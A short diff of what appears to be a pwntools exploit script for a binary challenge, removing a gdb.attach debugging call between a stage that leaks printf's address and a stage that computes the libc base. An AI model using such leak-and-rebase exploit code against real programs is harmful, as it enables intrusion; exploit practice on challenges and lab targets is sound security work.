@@ -71,7 +71,6 @@ def pwn():
     leaked = r.recvline()
     leaked = int(leaked, 16)
     log.success('Leaked printf: ' + hex(leaked))
-    gdb.attach(r)
 
     ### Stage 2: Calculate libc_base and offsets ###
     base = leaked - printf_libc
